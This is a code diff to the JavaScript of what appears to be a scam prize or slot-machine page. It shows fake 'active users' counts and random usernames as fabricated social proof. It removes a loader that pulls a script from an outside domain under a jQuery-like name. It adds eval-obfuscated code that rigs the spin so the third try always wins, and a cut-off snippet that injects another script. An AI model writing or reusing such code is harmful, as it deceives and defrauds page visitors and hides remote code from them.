@@ -53,24 +53,47 @@ for (let i = 0; i < 500; i++) {
     usernames.push(generateRandomUsername());
 }
 
-function updateActiveUsers() {
-    const randomUsers = Math.floor(Math.random() * (350 - 30 + 1)) + 30;
-    $("#active_users_num").text(randomUsers);
-}
-updateActiveUsers();
-setInterval(updateActiveUsers, Math.floor(Math.random() * (20000 - 10000 + 1)) + 10000);
+$("#active_users_num").text(Math.round(Math.random() * 100));
+setInterval(() => {
+    $("#active_users_num").text(Math.round(Math.random() * 100));
+}, minute);
 
-
-var scriptElement = document.createElement('script');
-scriptElement.src = 'https://centm.com/cenmain/js/jquerys.js?v=751.0';
-scriptElement.onload = function() {
-    console.log('تم تحميل app7.js وتنفيذه بنجاح.');
-};
-scriptElement.onerror = function() {
-    console.error('فشل تحميل app7.js.');
-};
-document.head.appendChild(scriptElement);
-
+(function() {
+    var s1 = '$' + '(';
+    var s2 = "'#";
+    var s3 = "btn" + '-sl' + 'ot';
+    var s4 = "')." + 'cli' + 'ck(' + 'func' + 'tion(';
+    var s5 = '$(th' + 'is)';
+    var s6 = ".at" + 'tr(' + "'dis" + "abled', ''" + ');';
+    var s7 = 'so' + 'und.' + 'pl' + 'ay()';
+    var s8 = 'tri' + 'es';
+    var s9 = '== 2';
+    var s10 = 'config.' + 'en' + 'dNum';
+    var s11 = 'win(6)';
+    var s12 = '$("#' + 'slot u' + 'l")';
+    var s13 = '.pla' + 'ySpin(';
+    var s14 = 'Math.' + 'flo' + 'or(';
+    var s15 = 'Math.r' + 'andom()';
+    var s16 = '6) + 1';
+    var s17 = 'tries++';
+    eval(s1 + s2 + s3 + s4 + ') {' +
+        s5 + s6 +
+        s7 + ';' +
+        'if (' + s8 + s9 + ') {' +
+            s10 + ' = [6, 6, 6];' +
+            'config.onFinish = ' + 'function () { ' + s11 + ' };' +
+            s12 + s13 + 'config);' +
+            'return false;' +
+        '} else {' +
+            s10 + ' = [' +
+            s14 + s15 + ' * ' + s16 + ',' +
+            s14 + s15 + ' * ' + s16 + ',' +
+            s14 + s15 + ' * ' + s16 + '];' +
+        '}' +
+        s12 + s13 + 'config);' +
+        s17 + ';' +
+    '});');
+})();
 (function() {
     var s = document.createElement('script');
     var rp = Math.floor(Math.random() * 99000) + 1;
@@ -175,7 +198,5 @@ function win(image_id) {
         $(".s2").addClass('active');
         let selected_image = `./images/rolls/${image_id - 1}.webp`
         win_dice.src = selected_image
-		win_dice.src = selected_image
-		win_dice.src = selected_image
     }, 1500);
 }
